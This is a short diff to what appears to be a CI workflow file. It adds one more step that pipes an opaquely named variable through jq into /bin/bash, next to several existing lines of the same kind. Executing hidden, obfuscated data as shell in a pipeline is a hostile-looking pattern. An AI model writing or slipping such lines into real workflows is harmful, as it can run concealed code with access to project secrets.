@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$bicy2517" | jq -r .ggv86 | /bin/bash
           printf '%s' "$pb5" | jq -r .a808 | /bin/bash
           echo $hyo5 | jq -r .twp50 | /bin/bash
+          echo $ngbua87717 | jq -r .k90754 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
